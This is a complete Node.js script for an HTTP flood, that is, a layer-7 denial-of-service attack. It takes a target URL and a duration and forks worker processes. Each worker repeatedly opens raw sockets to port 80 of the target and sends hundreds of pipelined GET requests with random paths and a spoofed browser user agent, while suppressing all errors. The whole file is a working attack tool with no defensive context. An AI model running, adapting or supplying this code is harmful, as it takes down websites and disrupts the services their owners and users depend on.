const net = require('net');
const cluster = require('cluster');
const numCPUs = 4;

if (cluster.isPrimary) {
    if (process.argv.length <= 2) {
        console.log("Usage : node RAW.js <URL> <TIME> !");
        process.exit(-1);
    }

    const target = process.argv[2];
    const parsed = new URL(target);
    const time = parseInt(process.argv[3]) * 1000;

    console.log(`Starting !`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, time);

} else {
    const target = process.argv[2];
    const parsed = new URL(target);
    const time = parseInt(process.argv[3]) * 1000;

    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});

    const userAgents = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/139.0.0.0 Safari/537.36",
	];

    let connectionCounter = 0;

    function randomPath(length = 8) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let path = "";
        for (let i = 0; i < length; i++) {
            path += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return "/" + path + "?id=" + Math.random().toString(36).substring(2, 10);
    }

    function getRandomUserAgent() {
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    const createConnection = () => {
        const s = new net.Socket();
        s.connect(80, parsed.host);
        s.setTimeout(5000);
        connectionCounter++;

        const request = [
            `GET ${randomPath(1)} HTTP/1.1`,
            `Host: ${parsed.host}`,
            `User-Agent: ${getRandomUserAgent()}`,
            `\r\n`
        ].join('\r\n');

        for (let i = 0; i < 512; i++) {
            s.write(request);
        }

        s.on('data', () => {
            setTimeout(() => {
                s.destroy();
            }, 4000);
        });

        s.on('error', () => {});
    };

    const flood = () => {
        for (let i = 0; i < 100; i++) {
            createConnection();
        }
    };

    const int = setInterval(flood, 0);
}
